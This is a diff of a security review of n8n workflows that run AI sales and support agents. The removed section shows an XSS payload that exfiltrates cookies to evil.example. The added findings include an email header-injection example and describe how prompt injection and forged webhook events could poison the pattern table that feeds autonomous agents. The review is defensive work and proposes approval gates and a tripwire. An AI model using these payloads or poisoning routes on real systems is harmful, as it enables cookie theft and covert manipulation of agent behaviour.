@@ -1,238 +1,307 @@
 # n8n Workflow Security Review
 
 Branch: `claude/review-n8n-security-fCPcd`
-Date: 2026-05-10
-Scope: 19 workflows discovered via the n8n MCP server (15 active, 4 inactive).
+Date: 2026-05-10 (updated after MCP access opened on 7 workflows)
+Scope: 19 workflows discovered via the n8n MCP server.
 
-## Summary
+## CRITICAL — rotate keys today
 
-- **18 of 19** workflows had `availableInMCP: false`, so a deep code-level audit
-  was only possible for one. Action required: enable *Settings → Available in
-  MCP* on each workflow listed in §3 so the rest of this review can be
-  completed.
-- One concrete vulnerability was found and is patched in §1.
-- Three workflows form a **self-modifying agent loop** that must be gated
-  behind human approval — see §2.
+The `Parallel 3-Model Extract` node in workflow `MwMUPmnGMOc0gDs3`
+(`TC — RingSense Insights → Maggie Pattern Extraction`) contains **three
+production LLM API keys hardcoded in plaintext** in a `Code` node:
 
----
+| Provider | Key prefix | Action |
+|---|---|---|
+| Anthropic | `sk-ant-api03-vhPd…` | Revoke → create new key → store as n8n credential |
+| OpenAI | `sk-proj-_NBQlq5W…` | Revoke → new key → n8n credential |
+| Google Gemini | `AIzaSyAYM4Ds…` | Revoke/regenerate → n8n credential |
 
-## 1. HTML/email injection — `TC — Weekly Verification Queue Report`
+These keys are visible to:
 
-**Workflow ID:** `5UMcYzORF4nigho7`
-**Node:** `Build Queue Report HTML` (`wvq-005`)
-**Severity:** Medium (High if Facebook/Mercately/RingCentral lead names ever
-flow into this report — and several active workflows do route external leads
-into Zoho).
+1. Anyone who can read the workflow (`workflow:read` scope).
+2. Anyone who can read execution data — and `saveDataSuccessExecution:"all"`
+   means every successful run's full code-node output is persisted.
+3. The git/version history of the workflow in n8n.
 
-### Issue
-
-The node interpolates Zoho lead fields directly into an HTML template with no
-escaping:
-
-```js
-rows += `<tr>
-  <td...><a href="${l.crm_link}" ...>${name}</a></td>
-  <td...>${l.Phone||'⚠️ Missing'}</td>
-  <td...>${dest}</td>
-  <td...>${l.Lead_Source||'—'}</td>
-  ...
-  <td...>${rep}</td>
-  ...`;
-```
-
-Lead names, phones, source strings, destinations and rep names originate from
-externally-controllable systems (Facebook Lead Ads, RingCentral, WhatsApp via
-Mercately). A lead created with a name like
-
-```
-"><img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
-```
-
-would render live HTML in the recipient's mailbox. Most desktop clients strip
-`<script>` but `<img>`, `<a>`, `<style>`, CSS-based phishing and link-rewrite
-attacks still work.
-
-### Fix
-
-Replace the body of `Build Queue Report HTML` with the patched JS in
-[`patches/wvq-005-build-queue-report-html.js`](./patches/wvq-005-build-queue-report-html.js).
-Diff highlights:
-
-- New `esc()` helper — HTML-encodes `& < > " '`.
-- Every lead-derived value (`name`, `dest`, `score`, `grade`, `rep`,
-  `l.Phone`, `l.Lead_Source`) is wrapped in `esc(...)` before interpolation.
-- `crm_link` is built from a numeric-only `id` (validated with a regex)
-  before interpolation into the `href`. If Zoho ever returns a non-numeric id
-  the row is skipped instead of being rendered.
-- `subject` is also escape-cleaned because Gmail renders display-name
-  tricks in some clients.
-
-Apply by opening the workflow in the n8n UI, replacing the `jsCode` parameter
-of node `wvq-005`, and re-publishing. The same `esc()` helper should be added
-to any sibling workflow that builds Slack/Email HTML from CRM data
-(see §3 — at minimum `TC — New Hot Lead Alert` and the three Slack notifiers).
-
-### Other observations on this workflow
-
-- `settings.saveDataSuccessExecution: "all"` persists ~500 leads of PII
-  (name/phone/email) per run in the n8n DB. Recommend setting this to
-  `"none"` for success runs and keeping `"all"` only for errors, plus a
-  retention/prune schedule.
-- Zoho `getAll` uses `limit: 500` with no pagination — a correctness, not
-  security, issue, but worth fixing.
-- `callerPolicy: "workflowsFromSameOwner"` is correct — keep it.
+**Fix:** rotate all three keys today, replace the hardcoded constants with
+`{{ $credentials.<credName>.apiKey }}` (or simply set them as
+`httpHeaderAuth` credentials on each LLM HTTP node — same as the
+`Haiku Judge & Dedupe` node already does for Anthropic). Also switch
+`saveDataSuccessExecution` to `"none"`.
 
 ---
 
-## 2. Autonomous agents creating new agents — REQUIRES HUMAN OVERSIGHT
+## Per-workflow findings
 
-The following three workflows form a closed self-improvement loop named
-**"Maggie"**. Their names, schedule, and data flow strongly indicate they
-generate or mutate downstream agent configuration without a human in the
-loop:
+### A. `4yMbMRvwAPIVsuE4` — TravelCloud AI — Slack Agent Router
 
-| ID | Name | Status | Schedule |
-|---|---|---|---|
-| `8oMmmqVbPsmqEazg` | Maggie — W1 Playbook Init / Reseed | inactive | (no trigger configured yet) |
-| `IJFL5DWJ5LCgAMAL` | Maggie — W2 Extraction Pipeline | inactive | nightly 02:00 |
-| `layXKcZewJV3jhGp` | Maggie — W3 Pattern Ranker | inactive | nightly 04:00 |
+3 nodes: `Agent Webhook` → `Route & Format` (Code) → `Post to Slack` (HTTP).
 
-Upstream feeders that pump data into this loop:
+**What it does.** Accepts POST to `/webhook/travelcloud-agent` with a JSON
+body `{ agent_type, message, priority }`, maps `agent_type` to one of
+7 Slack channel IDs (`sales`, `service`, `ops`, `it`, `approval`, `alert`,
+`supervisor`) and posts the message verbatim via Slack OAuth.
 
-- `MwMUPmnGMOc0gDs3` — `TC — RingSense Insights → Maggie Pattern Extraction`
-- `DRtB17JVV4MwLDhm` — `TC — RingCentral Call End → Maggie AI Follow-up`
+**This is the answer to "where are Sales / OPS / Supervisor".** They are
+*external* clients of this webhook — not n8n workflows. They almost
+certainly live in the Vercel deployment `vertex-ai-ebon.vercel.app`
+(referenced by the WhatsApp workflow). This n8n workflow is only the
+Slack-write endpoint.
 
-### Why this is risky
+**Findings:**
 
-I could not introspect the node graph because all three have
-`availableInMCP: false`. Based on naming and the typical structure of such
-loops:
+1. **No authentication on the webhook.** Anyone who guesses or learns the
+   URL `https://hfiiii.app.n8n.cloud/webhook/travelcloud-agent` can post to
+   any of your 7 internal Slack channels — including `supervisor` and
+   `approval`, which probably influence human decisions. This is also a
+   phishing primitive: a forged "[OPS AGENT] CRITICAL: please reset Zoho
+   admin password" lands in your channel with no provenance.
+   *Fix:* add a shared-secret header check at the top of `Route & Format`
+   (`if ($input.first().json.headers['x-shared-secret'] !== <secret>)
+   throw new Error('unauthorized')`), or move the auth to a Cloudflare
+   worker / reverse proxy in front of n8n.
+2. **No source identity in the Slack message.** The `text` includes the
+   `agent_type` label but nothing about *which* upstream caller produced
+   it. An attacker who breaches one agent gets full impersonation of all
+   seven labels. *Fix:* require callers to send a signed JWT and put
+   `iss`/`sub` in the posted message.
+3. **`priority` and `agent_type` are unvalidated.** `agentType` is
+   uppercased and put inside `*[${agentType.toUpperCase()} AGENT]*` — a
+   newline in `agent_type` lets the attacker forge later Slack mrkdwn lines.
+   *Fix:* whitelist `agent_type` against the keys of `channelMap`; reject
+   otherwise.
+4. **`callerPolicy: workflowsFromSameOwner`** — good.
 
-- **W1 "Playbook Init / Reseed"** likely (re)writes the prompts, tool lists,
-  or workflow definitions used by the customer-facing AI agents
-  (`SimpleLife AI Voice Follow-up`, `TravelCloud AI Slack Agent Router`,
-  `TravelCloud CS AI Mercately WhatsApp Agent`).
-- **W2 "Extraction Pipeline"** distills call transcripts / CRM signals into
-  candidate patterns.
-- **W3 "Pattern Ranker"** scores patterns and (likely) promotes the winners
-  back into the playbook used by W1.
+### B. `6Kqgji1W6NEnvuSF` — TravelCloud CS AI — Mercately WhatsApp Agent
 
-If any of the three has access to:
+Flow: `Webhook` → `Extract Fields` → `Call Maggie` (Vercel) →
+`Send via Mercately` (WhatsApp) → `Find Zoho Contact` → `Update Zoho Fields`
+→ `Log Call to Zoho`.
 
-- The `n8n-nodes-base.httpRequest` node pointed at the n8n REST API
-  (`/rest/workflows`), or
-- An LLM Agent with a tool that wraps `create_workflow_from_code`,
-  `update_workflow`, or `publish_workflow`, or
-- Direct writes to the prompt/playbook store consumed by other agents,
+**Findings:**
 
-…then it can mutate or spawn agents on its own. They are currently
-**inactive**, which is the right state until guarded.
+1. **No webhook authentication.** Path
+   `/webhook/travelcloud-whatsapp` will accept anything. The downstream
+   `Call Maggie` POSTs the body to your Vercel LLM endpoint as if it were
+   a real WhatsApp message, and the LLM's reply is then **sent via
+   Mercately to the supplied phone number**. So an attacker can:
+   - Send arbitrary WhatsApp messages from your business number to any
+     phone number, by POSTing
+     `{phone:"+1...", message:"prompt-injection here"}`.
+   - Poison your Zoho contact records (update arbitrary contacts' `Via_Getaways_Status`
+     and `AI_Sales_Battlecard` fields).
+   - Burn LLM credits.
+   *Fix:* require a Mercately signing header (Mercately webhooks support
+   HMAC) **and** an explicit phone-number allowlist or "must already be a
+   Zoho contact" gate before `Send via Mercately`. The fake header
+   `x-mercately-webhook: true` is **set by this workflow itself when calling
+   Maggie** — that's outbound spoofing, not inbound auth. Remove it.
+2. **`Find Zoho Contact` runs *after* `Send via Mercately`.** Messages are
+   sent before any check that the phone number is a known contact.
+3. **LLM output written to CRM with no review.** `Update Zoho Fields` writes
+   `Via_Getaways_Status` and `AI_Sales_Battlecard` straight from the LLM
+   reply. A prompt-injected `message` could move every contact to "Hot" or
+   plant misleading battlecard content. *Fix:* validate `priority` against
+   a closed enum (`Cold`/`Warm`/`Hot`) before the Zoho PUT.
+4. **`Log Call to Zoho` description includes raw user message** — that's
+   fine in CRM but the same string passes through future LLM calls (Maggie
+   conversation memory), so apply the same prompt-injection delimiter
+   pattern recommended in the hardening checklist §5.
 
-### Required guardrails before re-activating
+### C. `DRtB17JVV4MwLDhm` — TC — RingCentral Call End → Maggie AI Follow-up
 
-1. **Enable MCP access** on all three so this review can verify their tool
-   surface.
-2. **Insert a human-approval node** between W3's "promote" step and any
-   write to the prompt/playbook store (Slack approval node, or write to a
-   "pending" table the user reviews via a dashboard).
-3. **Strip n8n-API write scopes** from any credential these workflows use:
-   the credential should have read-only access to whatever store they pull
-   from, and *no* `workflow:create / workflow:update / workflow:publish`
-   scope unless explicitly required.
-4. **Pin the LLM tool list**: if W1/W2/W3 use an Agent node, the tools
-   array must be an explicit allowlist — no
-   `n8n-nodes-langchain.toolWorkflow` pointing at workflows with mutation
-   power.
-5. **Log every promotion** to an append-only audit channel (a dedicated
-   Slack channel or a `data_table` with a timestamp + diff) so any
-   silently-applied change can be retroactively detected.
-6. **Sandbox the prompt input**: pattern strings extracted in W2 are
-   downstream LLM input — apply the same prompt-injection sanitization
-   (delimit, strip system-prompt strings, length-limit) used elsewhere.
+Flow: `RingCentral Call Ended` (webhook) → `Extract Call Data` → 2× If
+gates → `ElevenLabs — Maggie Calls Member` (outbound call!) → `POST to
+Vercel /api/ringcentral-zoho` → `Zoho CRM — Create TC Lead` →
+`Slack — TC Follow-up Alert`.
 
-I will produce a detailed per-node review of W1/W2/W3 once they have MCP
-access enabled.
+**Findings:**
 
-### 2b. Three more autonomous agents — Supervisor / Sales / OPS (UNVERIFIED)
+1. **CRITICAL: unauthenticated webhook can trigger outbound robocalls.**
+   Path `/webhook/ringcentral-tc`. Body lets you set `from.phoneNumber`
+   directly, which becomes the **`to_number`** in the ElevenLabs/Twilio
+   `outbound-call` POST. So anyone with the URL can:
+   - Make your ElevenLabs AI agent place calls to arbitrary phone numbers
+     (TCPA / robocall regulatory risk).
+   - Create Zoho leads with attacker-supplied names/phones.
+   - Spam your Slack channel `C0AP2P9RVU5`.
+   - Burn Twilio/ElevenLabs minutes.
+   *Fix:* require RingCentral's `Verification-Token` (or a shared secret
+   header), **and** add an allowlist of phone-number ranges your callers
+   actually originate from, **and** an outbound-call rate limit per
+   destination per day.
+2. **Hardcoded ElevenLabs `agent_id` and outbound caller ID** — fine, just
+   note them as configuration that should move to env vars.
+3. **`callerName` injected into Zoho `lastName` and Slack message body**
+   without escaping — attacker controls Slack mrkdwn for the post. Use
+   `JSON.stringify` for the Slack body interpolation (Slack will render the
+   string raw rather than as markdown).
+4. **`saveDataSuccessExecution:"all"`** — same PII retention issue, every
+   call payload kept indefinitely.
 
-The owner has flagged a separate set of three autonomous agents named
-**Supervisor**, **Sales**, and **OPS** that also create or mutate downstream
-agents and must operate under human oversight.
+### D. `MwMUPmnGMOc0gDs3` — TC — RingSense Insights → Maggie Pattern Extraction
 
-**Visibility gap:** None of the 19 workflows returned by `search_workflows`
-across both projects (`My project`, `Harry Froget <hfroget@gmail.com>`) match
-those names — search queries for `"OPS"`, `"Sales"`, `"Supervisor"` all
-returned zero results. Possibilities:
+Flow: webhook → echo Validation-Token → extract event → gate →
+`Parallel 3-Model Extract` (Code) → `Parse + Enrich Patterns` →
+`Insert Candidate Patterns` (data_table) → `Slack`.
+Branch: `Haiku Judge & Dedupe` → `Parse + Enrich Multi` →
+`Insert Multi Patterns`.
 
-1. They are **archived** workflows (excluded from the default search
-   response).
-2. They live in a **different n8n instance** than the one this MCP server
-   connects to.
-3. They live in a project/folder the current MCP credential cannot list.
-4. They are **sub-workflows** referenced by one of the visible workflows via
-   `n8n-nodes-langchain.toolWorkflow` — most likely candidates:
-   `4yMbMRvwAPIVsuE4` (TravelCloud AI — Slack Agent Router) or
-   `6Kqgji1W6NEnvuSF` (TravelCloud CS AI — Mercately WhatsApp Agent).
+**Findings:**
 
-Until the owner regains n8n access, treat these three as **unverified but
-high-risk** and apply the guardrails in §2 (1)–(6) as soon as they can be
-identified. Specifically:
+1. **CRITICAL: three hardcoded LLM API keys** — see top of doc. Highest
+   priority.
+2. **Echo Validation-Token handshake covers subscription creation only.**
+   RingCentral only sends `Validation-Token` once when registering the
+   subscription; per-event posts have no equivalent header and this
+   workflow does not verify them. An attacker who learns the URL can post
+   fake "RingSense insights" events, which then:
+   - Trigger 3 paid LLM calls (Claude + GPT-4o-mini + Gemini Flash) per
+     event → unbounded LLM bill.
+   - Insert attacker-controlled "patterns" into your `xHQF7Iz1oL0FWoX0`
+     data_table — which is the **training-data source** for the Maggie
+     playbook the autonomous agents consume. This is the direct
+     poison-the-supervisor vector you were worried about.
+   *Fix:* require RingCentral signature or a shared secret on every event
+   (not just the handshake). Until that's in place, **disable this
+   workflow** — it's the highest-impact attack surface in the inventory.
+3. **No approval gate before `Insert Candidate Patterns` / `Insert Multi
+   Patterns`.** This is exactly the "agents creating agents on their own"
+   risk: a candidate pattern goes straight into the data_table that
+   downstream agents use to shape their behavior. Per the hardening
+   checklist §3, insert a `Wait → Slack approval` step here.
+4. **Refund regex `\b(refund|reembols|devoluci[oó]n|money back)\b`** is a
+   decent first pass but trivially bypassed (`re-fund`, `re fund`, `dinero
+   de vuelta`, `crédito`). Treat it as defense-in-depth, not the primary
+   guard. The primary guard should be the human-approval gate.
+5. **`saveDataSuccessExecution:"all"` + `saveManualExecutions:true`** —
+   every parsed pattern (and the API keys printed inside the code node's
+   output if execution data captures locals) is stored. Switch to
+   `"none"` and `false` for success.
+6. **`responseMode:"responseNode"`** with `Echo Validation-Token` returning
+   an empty body — that's fine for the handshake but means every real
+   event also gets a 200 with an empty body. Consider explicitly returning
+   `{ ok: true, ignored: true }` on non-handshake events for observability.
 
-- **Do not let the Supervisor self-spawn**. If it currently has the ability
-  to call `create_workflow_from_code` / `update_workflow` /
-  `publish_workflow` (either via the n8n MCP server or via an `httpRequest`
-  node targeting `/rest/workflows`), strip that capability and replace it
-  with a "draft → human approve → apply" two-step.
-- **Sales** and **OPS** likely each carry write credentials to CRM (Zoho) and
-  ops systems (RingCentral / Mercately / Slack). Their tool lists must be
-  explicit allowlists with the **smallest** scope that works (e.g. Zoho
-  `lead:update` on a single module, never `crm:full`).
-- Add a Slack approval node (or n8n's built-in `Wait` + form trigger) before
-  any tool call that **creates** records or **modifies** other agents'
-  prompts/playbooks.
+### E. `h4btjcQk3vcTkK0z` — System Health Monitor
 
-### Apply-when-unlocked runbook
+**Effectively dead code.** The `Run Health Checks` node returns `[]`,
+so `Alert Slack` never receives input. The comment says "placeholder —
+only alerts on failure once full checks are added". *Risk:* false sense of
+security; you think this is monitoring something. Either flesh it out
+(check webhook URLs, n8n workflow active status, Vercel agent health) or
+deactivate it so it's not misleading.
 
-Once the owner can sign in to n8n:
+Side issue: `channel: '#Operations'` uses a name rather than channel ID.
+That will silently fail to deliver if the channel is renamed. Use the ID.
 
-1. Confirm whether Supervisor / Sales / OPS are real workflows (search the
-   workflow list including archived) or internal nodes inside the Slack /
-   Mercately routers.
-2. For each: toggle **Settings → Available in MCP** ON and reply "go" — I'll
-   run the per-node audit and append §2c.
-3. Apply the `wvq-005` patch from
-   `docs/security/patches/wvq-005-build-queue-report-html.js` to the
-   Verification Queue workflow.
-4. Enable webhook signature verification on the six webhook-receiving
-   workflows in §3.
+### F. `eBshd1k5ucLWJWs6` — TC — New Hot Lead Alert (Zoho → Email)
+
+Flow: schedule (every 5 min) → Zoho `getAll(25)` → JS filter → If hot →
+Gmail HTML → Zoho `update`.
+
+**Findings — same HTML/email injection class as `5UMcYzORF4nigho7`:**
+
+1. **`subject` interpolates `Lead_Grade`, `First_Name`, `Last_Name`,
+   `Lead_Source` unescaped.** Email subject injection: a lead with
+   `Last_Name = "Smith\r\nBcc: attacker@evil.com"` could (depending on
+   Gmail's SMTP path normalization) inject headers. Even without that, the
+   subject is shown in clients verbatim, so attackers control your inbox
+   preview.
+2. **HTML `message` body interpolates every lead field unescaped** —
+   `First_Name`, `Last_Name`, `Phone`, `Email`, `Lead_Source`, `Destino_11`,
+   `Medio`, `Calificar_Paquete_Q_NQ`, `Vendedor`, `TC_Score`, `Lead_Grade`,
+   and `$json.id` into an `href`. Same exploit as
+   `wvq-005-build-queue-report-html.js` — apply the same `esc()` helper. I'll
+   ship a paired patch file.
+3. **Hot-lead filter uses `TC_Score >= 60` OR a long source-prefix OR.**
+   Functional, but if `Lead_Source` is attacker-controlled (via Facebook
+   Lead Ads form fields), they can opt themselves *into* the alert email
+   by submitting a source starting with `Network` or `PR -`. Low-severity
+   but worth noting.
+4. **`Update Lead Status in Zoho` runs *after* a successful email** — fine,
+   but if Gmail is rate-limited and fails, the lead is left un-flagged for
+   the next 5-min run and may produce duplicate emails. Set `onError` so
+   the update still happens, or use an idempotency marker.
+5. **`saveDataSuccessExecution:"all"`** — same retention concern.
+
+A patched email body is shipped at
+`docs/security/patches/lead-alert-email.html.expr` — paste it into the
+`message` parameter of `Send Lead Alert Email`.
+
+### G. `5UMcYzORF4nigho7` — TC — Weekly Verification Queue Report (already reviewed)
+
+Patch in `docs/security/patches/wvq-005-build-queue-report-html.js`.
+
+---
+
+## Cross-cutting issues
+
+1. **Webhooks have no authentication on any of the four inbound endpoints**
+   (`travelcloud-agent`, `travelcloud-whatsapp`, `ringcentral-tc`,
+   `ringcentral-ringsense`). All four URLs are guessable and host on
+   `hfiiii.app.n8n.cloud`. Treat each as publicly accessible — because
+   they are. Add at minimum a shared-secret header check.
+2. **`saveDataSuccessExecution: "all"` is set on most workflows.** This
+   persists PII (phone, email, names, call durations, conversation text)
+   indefinitely in the n8n DB. Set success retention to `"none"` and keep
+   `"all"` only for `errorWorkflow` runs.
+3. **No prompt-injection delimiters** anywhere user text enters an LLM
+   prompt (`Parallel 3-Model Extract`, `Call Maggie`, ElevenLabs dynamic
+   variables). Apply the patterns in
+   `docs/security/supervisor-agent-hardening.md` §5.
+4. **No audit table for agent actions.** Every Slack post, every Zoho write,
+   every outbound call should be logged append-only — same hardening doc §4.
+
+---
+
+## 2. Autonomous agents creating new agents (UPDATED)
+
+**Confirmed mechanism:** the Maggie loop *plus* the Vercel-hosted
+Supervisor/Sales/OPS agents share a single training surface — the
+`xHQF7Iz1oL0FWoX0` data_table populated by
+`MwMUPmnGMOc0gDs3` without an approval gate. Any pattern that lands in
+that table propagates into downstream agent behavior.
+
+Required guardrails before re-activating the Maggie W1/W2/W3 workflows:
+
+1. **Lock down the RingSense webhook** (per §D above) — until that's
+   authenticated, anyone can poison the table.
+2. **Add a `status:'candidate'` → human-approve → `status:'active'` gate.**
+   Patterns are already inserted with `status:'candidate'` — good. But
+   nothing currently flips them to `active`. Make that flip require a
+   Slack approval click into the `approval` channel
+   (`C0AP2QG5TMK`), and *only patterns with `status:'active'` should be
+   read by W1's playbook seeder.* This is one schema change + one
+   approval node.
+3. **Rotate the leaked LLM keys** (top of doc) — until you do, anyone
+   with the workflow JSON can run arbitrary Anthropic/OpenAI/Gemini
+   queries on your accounts.
+4. **Scope the n8n API credential** used by the Maggie workflows: it must
+   not have `workflow:create / update / publish` unless W1 specifically
+   needs that, and if it does, gate every promotion behind §3 of the
+   hardening checklist.
+5. **Tripwire**: add a workflow that alerts when the count of
+   `status:'active'` rows in the pattern table changes between two
+   successive 15-min polls — that's your "the supervisor mutated the
+   playbook" alarm.
 
 ---
 
 ## 3. Workflows still pending review (MCP not enabled)
 
-Priority order — top group is the actual internet-exposed attack surface:
-
-**Webhook-receivers (verify request signatures!):**
-- `p0fYHq69WohYcZC7` Facebook Lead Ads → Zoho CRM — verify `X-Hub-Signature-256`
-- `c6yYzZbXSg25ygTg` RingCentral → Zoho Leads — verify RingCentral `Verification-Token`
-- `DRtB17JVV4MwLDhm` TC — RingCentral Call End → Maggie AI Follow-up
-- `MwMUPmnGMOc0gDs3` TC — RingSense Insights → Maggie Pattern Extraction
-- `6Kqgji1W6NEnvuSF` TravelCloud CS AI — Mercately WhatsApp Agent — shared-secret/signature
-- `4yMbMRvwAPIVsuE4` TravelCloud AI — Slack Agent Router — verify `X-Slack-Signature` HMAC + 5-min replay window
-
-**LLM-bearing agents (prompt-injection / tool-misuse):**
+- `8oMmmqVbPsmqEazg` Maggie — W1 Playbook Init / Reseed
+- `IJFL5DWJ5LCgAMAL` Maggie — W2 Extraction Pipeline (02:00 nightly)
+- `layXKcZewJV3jhGp` Maggie — W3 Pattern Ranker (04:00 nightly)
+- `p0fYHq69WohYcZC7` Facebook Lead Ads → Zoho CRM
+- `c6yYzZbXSg25ygTg` RingCentral → Zoho Leads
 - `ZByC1P9VYGV28OI2` SimpleLife - AI Voice Follow-up Agent
 - `nn4b2pMIkforxmwx` Simplelife Training Agent - Voice Call
-- `KM3Hm9DHiVO8DIle` Angie, personal AI assistant (Telegram voice/text)
-
-**HTML/Slack-injection candidates (likely repeat of §1):**
-- `eBshd1k5ucLWJWs6` TC — New Hot Lead Alert (Zoho → Email)
-- `1bWPAi0BwsAswyie` Daily Pipeline Summary → Slack
+- `RE376XBi8WGfEyPT` Global Error Handler → Slack
 - `Y67cAGMNf1QeK6Bm` New Lead Alert → Slack
 - `dbaOf3Xvgpr7b0bD` Deal Stage Change → Slack
-- `RE376XBi8WGfEyPT` Global Error Handler → Slack — also check that error
-  payloads do not leak credentials/headers/tokens.
+- `1bWPAi0BwsAswyie` Daily Pipeline Summary → Slack
+- `KM3Hm9DHiVO8DIle` Angie, personal AI assistant
 
-**Other:**
-- `h4btjcQk3vcTkK0z` System Health Monitor — confirm monitored endpoints
-  don't surface secrets in error bodies.
+Toggle **Available in MCP** on the Maggie three first — those close out
+the autonomous-agent picture.
